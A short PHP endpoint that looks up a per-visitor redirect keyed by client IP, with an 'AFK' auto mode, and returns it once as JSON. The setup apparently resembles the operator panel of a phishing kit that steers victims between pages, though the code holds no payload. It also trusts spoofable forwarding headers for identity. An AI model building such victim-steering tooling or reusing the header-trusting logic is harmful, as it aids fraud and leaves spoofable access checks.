<?php
session_start();

header('Content-Type: application/json');
require_once __DIR__ . '/afk_status.php';

if (getAfkStatus()) {
    echo json_encode(['redirect' => false, 'autoMode' => true]);
    exit;
}


function getClientIP() {
    $ipKeys = ['HTTP_CF_CONNECTING_IP', 'HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR'];
    
    foreach ($ipKeys as $key) {
        if (array_key_exists($key, $_SERVER) === true) {
            foreach (explode(',', $_SERVER[$key]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    

    $remote_addr = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    if ($remote_addr === '::1' || $remote_addr === '127.0.0.1') {
        return '127.0.0.1'; // Return IPv4 localhost instead of IPv6
    }
    
    return $remote_addr;
}

$user_ip = getClientIP();

if (!$user_ip || $user_ip === 'unknown') {
    echo json_encode(['redirect' => false, 'error' => 'No IP address']);
    exit;
}

$ip_file = "sessions/{$user_ip}.json";


if (file_exists($ip_file)) {
    $redirect_data = json_decode(file_get_contents($ip_file), true);
    
    if ($redirect_data && isset($redirect_data['redirect_to'])) {

        unlink($ip_file);
        
        echo json_encode([
            'redirect' => true,
            'redirect_to' => $redirect_data['redirect_to'],
            'timestamp' => $redirect_data['timestamp']
        ]);
        exit;
    }
}

echo json_encode(['redirect' => false]);
?>